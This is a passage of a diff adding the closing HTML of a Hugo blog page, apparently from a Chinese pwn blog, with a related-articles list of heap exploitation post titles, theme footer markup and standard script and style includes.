+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-obstack/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_obstack.jpg" loading="lazy" data-key="" data-hash="/image/House_of_obstack.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of obstack</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-pig/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_pig.png" loading="lazy" data-key="" data-hash="/image/House_of_pig.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of pig</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/io%E5%88%A9%E7%94%A82/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/IO2.jpg" loading="lazy" data-key="" data-hash="/image/IO2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">IO利用2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-botcake/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_botcake.jpg" loading="lazy" data-key="" data-hash="/image/House_of_botcake.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of botcake</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/tcache-stashing-unlink-attack/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/tcache_stashing_unlink_attack.jpg" loading="lazy" data-key="" data-hash="/image/tcache_stashing_unlink_attack.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">tcache stashing unlink attack</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 chang
+    </section>
+    
+    <section class="powerby">
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.a2bdfcd44ef572203220652568b318b0d339e1b66627df894cad45601e4caa56.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+     
+    background: url("/background/Ai.jpg") no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+     
+    margin: 0;  
+    min-height: 100vh;  
+  }
+
+ 
+  .container {
+    position: relative;
+  }
+  .container::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fda2e363; 
+    z-index: -1; 
+  }  
+
+
+
+
+  
+
+
+</style>
+<script src="/background/sakura.js"></script>
+
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+    </body>
+</html>
